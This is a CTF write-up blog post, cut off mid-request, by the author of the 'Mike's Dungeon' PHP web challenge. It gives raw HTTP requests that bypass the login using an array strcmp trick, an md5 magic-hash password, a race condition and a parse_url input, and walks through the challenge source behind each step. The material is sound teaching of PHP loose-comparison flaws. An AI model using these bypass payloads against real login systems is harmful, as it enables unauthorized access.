@@ -1,0 +1,715 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        Fwhibbit CTR (CTF): Solving Mike&#39;s Dungeon ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Fwhibbit CTR (CTF): Solving Mike&amp;rsquo;s Dunegon."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/ctr-writeup-mike/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Fwhibbit CTR (CTF): Solving Mike&#39;s Dungeon"/>
+<meta name="twitter:description" content="Fwhibbit CTR (CTF): Solving Mike’s Dunegon."/>
+
+
+
+<meta property="og:title" content="Fwhibbit CTR (CTF): Solving Mike&#39;s Dungeon"/>
+<meta property="og:description" content="Fwhibbit CTR (CTF): Solving Mike’s Dunegon."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/ctr-writeup-mike/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-04-22T14:55:00+00:00"/>
+<meta property="article:modified_time" content="2020-04-22T14:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Fwhibbit CTR (CTF): Solving Mike’s Dungeon</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-04-22
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/fwhibbit/">#Fwhibbit</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/php/">#PHP</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/loosecomparison/">#LooseComparison</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/typejuggling/">#TypeJuggling</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/racecondition/">#RaceCondition</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/parse_url/">#Parse_URL</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="tldr">TL;DR</h1>
+<p>In this post I’ll be covering <a href="https://ctf.fwhibbit.es/register" target="_blank">Fwhibbit&amp;rsquo;s CTF</a> in cooperation with an online conference called <a href="https://c0r0n4con.com/" target="_blank">C0r0n4CON</a> to support <a href="https://www2.cruzroja.es/" target="_blank">Cruz Roja</a> NGO in their fight against coronavirus. At the time i’m writing this article, c0r0n4CON has almost raised 40k€ for this campaign.</p>
+<p>The reason why I created this challenge was pretty simple, I wanted to join all the stuff I learned about PHP and its misconfiguration exploitation in CTFs in a challenge. It’s a mix between Loose Comparison, Type Juggling, Race Conditions and a propper understanding of Parse_URL PHP’s function.</p>
+<h2 id="disclaimer">DISCLAIMER</h2>
+<p>I have no degree in computer science, programming, cybersecurity… Mistakes can appear (and they will) so please keep it in mind. (If any, I’d thank you for contacting me via <a href="https://t.me/jorgectf" target="_blank">Telegram</a> or <a href="https://twitter.com/jorge_ctf" target="_blank">Twitter</a>) :D</p>
+<h1 id="challenge">Challenge</h1>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/mike-1.png" alt=""/></p>
+<p>Challenge information:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/mike-2.png" alt=""/></p>
+<p>Download:</p>
+<p><a href="https://jorgectf.gitlab.io/blog/static/fwhibbit/mike_dungeon_source.zip">mike_dungeon_source.zip</a></p>
+<h1 id="fast-solution-no-explanation">Fast Solution (No explanation)</h1>
+<p>In this section, Im going to leave here the raw requests that had to be done to complete the challenge. If you want a explanation about it, scroll down!</p>
+<h5 id="whatever-can-be-blank">“whatever” can be blank</h5>
+<h2 id="first-part">First part</h2>
+<h4 id="first-request">First request</h4>
+<pre tabindex="0"><code>POST /index.php HTTP/1.1
+Cookie: PHPSESSID=PHPSESSID-COOKIE
+
+username[]=whatever&amp;password=240610708&amp;d56b699830e77ba53855679cb1d252da=whatever
+</code></pre><h4 id="second-request">Second request</h4>
+<p>It is the same as the one before, but has to be sent before it finishes.</p>
+<pre tabindex="0"><code>POST /index.php HTTP/1.1
+Cookie: PHPSESSID=PHPSESSID-COOKIE
+
+username[]=whatever&amp;password=240610708&amp;d56b699830e77ba53855679cb1d252da=whatever
+</code></pre><h2 id="second-part">Second part</h2>
+<p>They all must be sent like the first part.</p>
+<h3 id="first-request-1">First request</h3>
+<pre tabindex="0"><code>POST /index.php HTTP/1.1
+Cookie: PHPSESSID=PHPSESSID-COOKIE
+
+username[]=whatever&amp;password=240610708&amp;d56b699830e77ba53855679cb1d252da=whatever
+</code></pre><h3 id="second-request-1">Second request</h3>
+<pre tabindex="0"><code>POST /manager.php?0d107d09f5bbe40cade3de5c71e9e9b7=whatever HTTP/1.1
+Cookie: PHPSESSID=PHPSESSID-COOKIE
+
+775ec01bf5ff1f62690ad3f884302080bda524e1=whatever&amp;yourinput=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddds.ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppphhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhp:whatever@whatever
+</code></pre><h2 id="third-request">Third request</h2>
+<pre tabindex="0"><code>GET /manager.php?debug=whatever HTTP/1.1
+Cookie: PHPSESSID=PHPSESSID-COOKIE
+</code></pre><h1 id="explained-solution">Explained solution</h1>
+<h1 id="first-stage">First Stage</h1>
+<p>The first thing we have to do is inspecting the source, where we will be having a hint (a comment by Mike).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- Self-reminder: Dont forget to change your goals in your TXT file. --&gt;</span>
+</code></pre></div><p>Now we assume there’s a txt file hosted by the server (or not) where Mike writes his goals. Making some guessing, we could guess there’s a txt called “mike.txt” in the webroot, or we could just visit “robots.txt” to see whether there are pages Mike doesn’t want the crawlers to see.</p>
+<pre tabindex="0"><code>http://MIRROR/mike.txt
+</code></pre><pre tabindex="0"><code>My goals for 2020:
+
+Tidy my bedroom everyday.
+Finish homework everyday.
+Change administrator username from mike to hacker1337 to beat all those h4x0rs!
+Learn Javascript.
+Change password whose sha1 is 0e0776 and more random numbers to admin1337.
+Get into http cookie without httponly flag set bounty hunting.
+
+Done:
+
+Learn PHP.
+Add debug param to debug index.
+Learn Javascript.
+</code></pre><p>This file is telling us lots of things:</p>
+<ul>
+<li>The current username is “mike”</li>
+<li>The password is 0e0776 <strong>and more random numbers</strong></li>
+<li>There’s a GET parameter called debug in index.php</li>
+</ul>
+<p>With the debug parameter we can see the source code:</p>
+<pre tabindex="0"><code>http://MIRROR/?debug
+</code></pre><p>The code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;background-image: url(&#39;img.jpg&#39;);&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+        <span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;creds.php&#39;</span>; <span style="color:#75715e"># Including user, pwd and flag variables
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;login&#39;</span>)]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>], <span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>($user))))))))))))))))) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#75715e"># Are you a crypto nerd?
+</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#a6e22e">sha1</span>($pwd)) {
+                    <span style="color:#a6e22e">session_start</span>();
+                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+                        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: manager.php&#34;</span>);
+                    } <span style="color:#66d9ef">else</span> {
+                        $_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;oooooumama&#34;</span>;
+                        <span style="color:#a6e22e">session_write_close</span>();
+                        <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); <span style="color:#75715e"># No bruteforce :)
+</span><span style="color:#75715e"></span>                        <span style="color:#a6e22e">session_start</span>();
+                        <span style="color:#a6e22e">unset</span>($_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>]);
+                    }
+                } <span style="color:#66d9ef">else</span> {
+                    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Hey h4x0r!&#34;</span>);
+                }
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Bye h4x0r!&#34;</span>);
+            }
+            <span style="color:#75715e"># Secret AUTH
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;s3cr3t&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($pwd)) {
+                <span style="color:#66d9ef">echo</span> $flag;
+            }
+        }
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;debug&#39;</span>])) {
+            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>, <span style="color:#66d9ef">true</span>);
+        }
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;debug&#39;</span>])) { <span style="color:#75715e"># Just for debugging
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">var_dump</span>($_SESSION);
+            <span style="color:#66d9ef">die</span>();
+        }        
+
+    <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;Mike&#39;s Dungeon&lt;/title&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;h1 style=&#34;color: white;&#34;&gt;&lt;center&gt;Mike&#39;s Dungeon&lt;/center&gt;&lt;/h1&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;hr&gt;&lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;center&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;form method=&#34;post&#34; action=&#34;&lt;?php basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34; name=&#34;signin-form&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;div class=&#34;form-element&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">                &lt;label style=&#34;color: white;&#34;&gt;Username -&gt; &lt;/label&gt;
+</span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;password&#34; name=&#34;username&#34; required /&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;div class=&#34;form-element&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">                &lt;label style=&#34;color: white;&#34;&gt;Password -&gt; &lt;/label&gt;
+</span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;password&#34; name=&#34;password&#34; required /&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;button type=&#34;submit&#34; name=&#34;login&#34; value=&#34;login&#34;&gt;Log In&lt;/button&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;/center&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;!-- Self-reminder: Dont forget to change your goals in your TXT file. --&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div><p>In the very first place, there’s a <a href="https://www.php.net/manual/en/function.require-once.php" target="_blank">require_once</a> sentence calling a file “creds.php”. The comment tell us it is inluding $user, $pwd and ¡$flag!, but the third one won’t be called in this stage.</p>
+<p>Then, the server compares if there’s a POST parameter whose name must be the md5sum of “login”, a POST parameter whose name must be “username” and a third param whose name must be “password”. The trick here is that the server is searching for a POST parameter whose <strong>name</strong> must be the <strong>md5sum of “login”</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_POST[<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;login&#39;</span>)]
+</code></pre></div><p>This way, the post parameter should be:</p>
+<pre tabindex="0"><code>d56b699830e77ba53855679cb1d252da=whatever
+</code></pre><p>Meanwhile the thing usually done is this one:</p>
+<pre tabindex="0"><code>$_POST[&#39;login&#39;]
+</code></pre><p>Where the request is like this:</p>
+<pre tabindex="0"><code>login=whatever
+</code></pre><hr/>
+<h3 id="understanding-get-and-post-parameters">Understanding GET and POST Parameters</h3>
+<p>The trick I wanted the user to spot is that <code>$_POST[&#39;whatever&#39;]</code> refers to the value sent inside “whatever” parameter, so <code>$_POST[md5(&#39;whatever&#39;)]</code> will be a parameter whose <strong>name</strong> is the md5sum of “whatever”. Some might have confused it with the parameter whose <strong>value</strong> equals to the md5sum of the “whatever” parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>($_POST);
+<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span>) {
+}
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $_POST[<span style="color:#e6db74">&#39;whatever&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;somethingelse&#34;</span>;
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>($_POST);
+<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
+  [<span style="color:#e6db74">&#34;whatever&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">13</span>) <span style="color:#e6db74">&#34;somethingelse&#34;</span>
+}
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">isset</span>($_POST));
+<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> $_POST[<span style="color:#e6db74">&#39;whatever&#39;</span>];
+<span style="color:#a6e22e">somethingelse</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>($_POST);
+<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span>) {}
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $_POST[<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;whatever&#39;</span>)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;somethingelse&#34;</span>;
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>($_POST);
+<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
+  [<span style="color:#e6db74">&#34;008c5926ca861023c1d2a36653fd88e2&#34;</span>]<span style="color:#f92672">=&gt;</span>
+  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">13</span>) <span style="color:#e6db74">&#34;somethingelse&#34;</span>
+}
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;whatever&#39;</span>]));
+<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">false</span>)
+</code></pre></div><p>Then, the only thing to take into account was that GET parameters are declared in the URL and POST parameters are declared in the body of the POST request.</p>
+<pre tabindex="0"><code>GET /page?GETPARAM=GETPARAM-VALUE HTTP/1.1
+</code></pre><pre tabindex="0"><code>POST /page HTTP/1.1
+
+&lt;-- Headers --&gt;
+
+POSTPARAM=POSTPARAM-VALUE&amp;SECONDPOSTPARAM=SECONDPOSTPARAM-VALUE
+</code></pre><hr/>
+<h3 id="strcmp-bypass">strcmp “Bypass”</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>], <span style="color:#a6e22e">lotsofshasandmd5s</span>($user) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</code></pre></div><p>This is NOT a bypass of <a href="https://www.php.net/manual/en/function.strcmp.php" target="_blank">strcmp</a> function. In this stage, we are bypassing this if statement beacause a <a href="https://www.copterlabs.com/strict-vs-loose-comparisons-in-php/" target="_blank">loose comparison</a> is applied in the return of strcmp function value with 0.</p>
+<p>When strcmp compares to <strong>strings</strong> (yes, strings, because this function ONLY compares strings) returns <strong>0</strong>, but when <strong>other type</strong> is compared, it returns <strong>NULL</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;whatever&#34;</span>, <span style="color:#e6db74">&#34;whatever&#34;</span>));
+<span style="color:#a6e22e">int</span>(<span style="color:#ae81ff">0</span>)
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">strcmp</span>(<span style="color:#66d9ef">array</span>(), <span style="color:#e6db74">&#34;whatever&#34;</span>));
+<span style="color:#66d9ef">NULL</span>
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">strcmp</span>(<span style="color:#66d9ef">array</span>(), <span style="color:#e6db74">&#34;whatever&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">false</span>)
+<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">strcmp</span>(<span style="color:#66d9ef">array</span>(), <span style="color:#e6db74">&#34;whatever&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+</code></pre></div><p>This 0 == NULL loose comparison can be seen in <a href="https://www.php.net/manual/en/types.comparisons.php" target="_blank">this table</a>.</p>
+<p>So then we have to send a POST param whose <strong>name</strong> must equal “username” and contain brackets [] to tell php it is an array and make strcmp to return NULL.</p>
+<pre tabindex="0"><code>username[]=whatever
+</code></pre><hr/>
+<h3 id="loose-comparison-involving-magic-hashes-and-type-juggling">Loose Comparison involving Magic Hashes and Type Juggling</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#a6e22e">sha1</span>($pwd)) {
+</code></pre></div><p>The first thing to take into account here is that mike’s txt file told us…</p>
+<pre tabindex="0"><code>Change password whose sha1 is 0e0776 and more random numbers to admin1337.
+</code></pre><p>What happens when a number is followed by a letter “e” and <strong>more numbers</strong>?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">0e07768478347</span>);
+<span style="color:#a6e22e">float</span>(<span style="color:#ae81ff">0</span>)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">0e07768478347</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0e7384723476283946</span>); <span style="color:#75715e"># Same as 0 == 0
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+</code></pre></div><p>When PHP sees a power can be done, even if it is a string, it converts the string to a float. (This is called <a href="https://www.php.net/manual/en/language.types.type-juggling.php" target="_blank">Type Juggling</a>)</p>
+<p>Knowing this, we now have to search for a MD5 string whose value matches what we want. 0 followed by “e” and more numbers. To do it, we can just search for “md5 magic hash” and PayloadAllTheThings appears with a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling" target="_blank">git</a> about it. It can be done in PHP too, like Chivato does in <a href="https://hackmd.io/@Chivato/rkj-Y1GVI#COMPARE-THE-PAIR" target="_blank">this</a> post (appending a salt).</p>
+<p>Now we have the first request done!</p>
+<pre tabindex="0"><code>POST /index.php HTTP/1.1
